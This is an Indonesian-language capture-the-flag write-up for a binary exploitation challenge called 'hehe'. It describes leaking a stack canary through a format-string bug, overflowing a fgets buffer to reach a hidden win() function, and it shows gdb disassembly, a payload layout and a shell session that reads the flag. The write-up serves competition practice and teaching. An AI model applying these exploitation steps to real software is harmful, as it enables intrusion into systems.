# hehe

## analysis
dari hasil melakukan _fast check_ dengan memeriksa metadata, proteksi , serta menjalankan program nya, terlihat program ini adalah file binary x86-64 dengan seluruh proteksi aktif kecuali proteksi PIE sehingga
semua alamat memory yang ada di file tidak akan berubah. program ini menyediakan layanan daftar nama dan umur dengan format `name %s age %d`. 

saya berhasil menemukan kerentanan format string pada fungsi print_name . karena menurut hasil dekompilasi dari ghidra, program mencetak nama tanpa format string. selain itu saya juga menemukan
adanya fungsi win() yang akan memberikan akses shell jika berhasil memanggilnya. fungsi win tersebut tidak dipanggil sama sekali pada alur program normal. 

kerentanan buffer overflow juga saya temukan ada di fungsi create_name, fungsi ini mengizinkan saya memberi input hingga 0x100 byte sedangkan ukuran variabel penampung hanya 0x88 byte

menurut data yang sudah dikumpulkan :
- kerentanan format string
- kerentanan buffer overflow
- terdapat fungsi win
- proteksi canary aktif

rencana exploit
- mencari value canary menggunakan format string vulnerability
- melakukan ret2win
- mendapatkan shell dan mengambil flag di server

# exploit

pertama saya harus mencari tahu offset / jarak pasti dari lokasi input ke return address. saya gunakan gdb untuk mencarinya. 

```Assembly
   0x00000000004012ab <+108>:   lea    rax,[rbp-0x90]
   0x00000000004012b2 <+115>:   mov    esi,0x100
   0x00000000004012b7 <+120>:   mov    rdi,rax
   0x00000000004012ba <+123>:   call   0x401100 <fgets@plt>
```
ini adalah fungsi yang memiliki kerentanan tersebut, terlihat ia menyimpan input di [rbp-0x90]. maka jarak input saya ke return address adalah 0x90 + saved rbp.
namun karena ada proteksi canary saya harus menguranginya terlebih dahulu dengan 8. 

```
canary = 8 byte
saved rbp = 8 byte
padding = b'a'*0x90-8 + canary + b'a'8 + alamat win
```

dengan [skrip python](solver.py) saya berhasil memanipulasi value dari return address dan melewati proteksi canary sehingga saya mendapatkan akses shell.

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(hehe)
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/LKS/hehe/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/rotalactf/reno/pwn/LKS/hehe/chall': pid 8291
[*] Switching to interactive mode
Format: "name %s age %d"
Enter input: [*] Stored.
Congratulations!
$ ls
chall  exploit.py  flag.txt  seein.py  solver.py
$ cat flag.txt
LKS{fb154a184edd8f083bdf0024d15dc944}
$
```

flag = LKS{fb154a184edd8f083bdf0024d15dc944}
